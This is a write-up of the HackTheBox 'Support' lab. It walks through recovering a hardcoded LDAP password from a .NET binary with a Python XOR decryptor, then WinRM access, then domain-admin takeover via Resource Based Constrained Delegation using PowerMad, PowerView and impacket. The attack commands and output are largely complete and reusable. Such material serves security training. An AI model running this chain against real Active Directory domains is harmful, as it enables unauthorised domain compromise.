# Support

## Introduction

Welcome to my another writeup! In this HackTheBox [Support](https://app.hackthebox.com/machines/Support) machine, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Difficulty: Easy

- Overall difficulty for me: Hard
    - Initial foothold: Medium
    - Privilege escalation: Hard

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# export RHOSTS=10.10.11.174
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-09-18 08:49:08Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57579/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58137/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-18T08:50:00
|_  start_date: N/A
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21155/tcp): CLEAN (Timeout)
|   Check 2 (port 19493/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 58423/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

According to `rustscan` and `nmap` result, we have 20 ports are opened:

Ports Open                                        | Service
--------------------------------------------------|------------------------
53                                                | Simple DNS Plus
88,464                                            | Kerberos
135,593,49664,49668,49674,49679,49703,57579,58137 | RPC
139,445                                           | SMB
389,636,3268,3269                                 | LDAP
5985                                              | WinRM

We can see there are ldap, kerberos services running, **which is an active directory's domain controller.**

- Found domain: `support.htb`

**Let's add it to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# echo "$RHOSTS support.htb" | tee -a /etc/hosts
```

## Ldap on Port 389,636,3268,3269

**Try anonymous authenication:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# ldapsearch -x -H ldap://$RHOSTS -b "dc=support,dc=htb"                                  
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

**It needs authentication.**

## Kerberos on Port 88,464

**Try brute forcing username:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm="support.htb",userdb="/usr/share/seclists/Usernames/top-usernames-shortlist.txt" $RHOSTS
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-18 05:10 EDT
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.20s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     administrator@support.htb
|_    guest@support.htb
```

Nothing useful.

## SMB on Port 139,445

**Enumerate share:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# smbclient -L \\$RHOSTS        
Password for [WORKGROUP\nam]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share
```

- Found unusual share: `support-tools`

**Enumerate share `support-tools`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# smbclient \\\\$RHOSTS\\support-tools
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
```

**The `UserInfo.exe.zip` looks interesting. Let's `get` that file:**
```
smb: \> get UserInfo.exe.zip
```

**Let's `unzip` it:**
```
┌──(root🌸siunam)-[~/…/htb/Machines/Support/smb]
└─# file UserInfo.exe.zip 
UserInfo.exe.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                         
┌──(root🌸siunam)-[~/…/htb/Machines/Support/smb]
└─# unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
```

**The `UserInfo.exe` is `.Net` assembly, maybe we can reverse engineering it with [dnSpy](https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8)?**
```
┌──(root🌸siunam)-[~/…/htb/Machines/Support/smb]
└─# file UserInfo.exe    
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

**We can use `mono` or `wine64` to run Windows executable in Linux:**
```
┌──(root🌸siunam)-[~/…/htb/Machines/Support/smb]
└─# mono UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user
```

Looks like it's fetching an Active Directory's user details. Maybe via LDAP query.

**Let's just run `strings` first to see string inside that binary:**
```
┌──(root🌸siunam)-[~/…/htb/Machines/Support/smb]
└─# strings UserInfo.exe                
[...]
getPassword
enc_password
get_Message
[...]
username
Username
[...]
```

Hmm... Some interesting strings, **we can use dnSpy for futher enumeration.**

# Initial Foothold

**To do so, I'll:**

- Transfer the zip file:

```
┌──(root🌸siunam)-[~/…/htb/Machines/Support/smb]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

PS C:\Users\siunam\Desktop> Invoke-WebRequest -Uri http://192.168.183.141/UserInfo.exe -OutFile UserInfo.exe
```

- Analyze the executable via dnSpy:

After fumbling around in dnSpy, I found **a hardcoded LDAP connection, and an encrypted password**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Support/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Support/images/a2.png)

- Encrypted password: `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
- Key: `armando`

**Function `getPassword()`:**
```c#
public static string getPassword()
    {
      byte[] array = Convert.FromBase64String(Protected.enc_password);
      byte[] array2 = array;
      for (int i = 0; i < array.Length; i++)
      {
        array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
      }
      return Encoding.Default.GetString(array2);
    }
```

Since we found the decryption function, the encrypted password and key, we can decrypt the password too!

**To do decrypt the password, I'll write a [simple python script](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Support/decrypt_password.py):** (Basically just copying the function `getPassword()`, and convert it from C# to python.)
```py
#!/usr/bin/env python3

import base64

enc_password = b'0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'

array = base64.b64decode(enc_password)
array2 = ''

for i in range(len(array)):
  array2 += chr(array[i] ^ key[i % len(key)] ^ 223)

print(f'[+] Decrypted password is: {array2}')
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# python3 decrypt_password.py
[+] Decrypted password is: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Also, in dnSpy, I also found that the LDAP connection is using username `support`.

**Found it! Now, let's enumerate usernames via the LDAP protocol**! 
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# ldapsearch -x -H ldap://$RHOSTS -b 'dc=support,dc=htb' -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 'sAMAccountName' | grep sAMAccountName                  
# requesting: sAMAccountName 
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: Administrators
sAMAccountName: Users
sAMAccountName: Guests
[...]
sAMAccountName: ldap
sAMAccountName: support
sAMAccountName: smith.rosario
sAMAccountName: hernandez.stanley
sAMAccountName: wilson.shelby
sAMAccountName: anderson.damian
sAMAccountName: thomas.raphael
sAMAccountName: levine.leopoldo
sAMAccountName: raven.clifton
sAMAccountName: bardot.mary
sAMAccountName: cromwell.gerard
sAMAccountName: monroe.david
sAMAccountName: west.laura
sAMAccountName: langley.lucy
sAMAccountName: daughtler.mabel
sAMAccountName: stoll.rachelle
sAMAccountName: ford.victoria
sAMAccountName: MANAGEMENT$
sAMAccountName: attackersystem$
sAMAccountName: sysr3llPC$
sAMAccountName: shrekt$
sAMAccountName: eclipse$
```

Hmm... The user `support` stood out, as it doesn't follow the `<firstname>.<lastname>` pattern.

**Let's extract it's info!**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# ldapsearch -x -H ldap://$RHOSTS -b 'dc=support,dc=htb' -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=support,CN=Users,DC=support,DC=htb'
[...]
# support, Users, support.htb
[...]
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
[...]
```

The `info` field looks like is a password!

**Also, this `support` user is inside the group `Remote Management Users`, which means it can login via WinRM protocol!**

**Let's use `evil-winrm` to remotely login!**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i $RHOSTS
[...]
*Evil-WinRM* PS C:\Users\support\Documents> whoami;hostname;ipconfig /all
support\support
dc

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc
   Primary Dns Suffix  . . . . . . . : support.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : support.htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-B2-AE
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.11.174(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

I'm user `support`!

**user.txt:**
```
*Evil-WinRM* PS C:\Users\support\Documents> type ..\Desktop\user.txt
{Redacted}
```

# Privilege Escalation

## support to Administrator

According to [HackingArticles](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/), we can leverage one of the domain escalation methods, **Resource Based Constrained Delegation**.

**First, I'll upload `PowerView.ps1` and `PowerMad.ps1` via `evil-winrm`:**
```
*Evil-WinRM* PS C:\Users\support\Documents> upload /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> upload /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
```

**Then, import those modules:**
```
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\powerview.ps1
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\powermad.ps1
```

In an Active Directory environment, **a domain user can add a computer object into the domain**, we can check that via `Get-DomainObject`:

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity 'dc=support,dc=htb' -Domain support.htb

[...]
ms-ds-machineaccountquota                   : 10
[...]
```

Yep, we can add 10 computer objects into the domain.

**Next, I'll check the machine's version:**
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController

[...]
OSVersion                  : Windows Server 2022 Standard
[...]
```

**It's running `Windows Server 2022`.**

Finally, let's **check the target computer doesn't have the attribute `msds-allowedtoactonbehalfofotheridentity` set.**

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC   
```

It's empty!!

Armed with the above information, **we can create a fake computer object!** (Source: [Red Team Experiments](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#creating-a-new-computer-object))

```
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount fakeuser -Password $(ConvertTo-SecureString 'fakepassword' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = fakeuser$
Verbose: [+] Distinguished Name = CN=fakeuser,CN=Computers,DC=support,DC=htb
[+] Machine account fakeuser added
```

**Find it's SID:**
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer fakeuser 

[...]
name                   : fakeuser
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5105
[...]
```

**Create a new raw security descriptor for the `fakeuser` computer principal:** (Remember change the SID to your newly created fake user.)
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5105)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

```
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5105)"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
```

**Applying the security descriptor bytes to the target machine::**
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**Now, we can start to impersonate to get a ticket.**

- Before impersonation, please add `dc.support.htb` to `/etc/hosts`:

```
10.10.11.174 support.htb dc.support.htb
```

- Generate a ticket via `impacket-getST`:

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# impacket-getST support.htb/fakeuser:fakepassword -dc-ip $RHOSTS -impersonate administrator -spn www/dc.support.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*]   Requesting S4U2self
[*]   Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

- Once the ticket is generated, we can connect to the machine via `impacket-wmiexec`:

**Specify which ticket should we use:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# export KRB5CCNAME=administrator.ccache
```

**connect to the machine via `impacket-wmiexec`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Support]
└─# impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator

C:\>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc
   Primary Dns Suffix  . . . . . . . : support.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : support.htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-B2-AE
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.11.174(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

I'm `administrator`! :D

# Rooted

**root.txt:**
```
C:\>type C:\Users\Administrator\Desktop\root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Support/images/a3.png)

# Conclusion

What we've learned:

1. LDAP Enumeration
2. Kerberos Enumeration
3. SMB Share Enumeration
4. Reverse Engineering .Net Assembly
5. Decrypting Encrypted Password via Custom Python Script
6. Privilege Escalation via Resource Based Constrained Delegation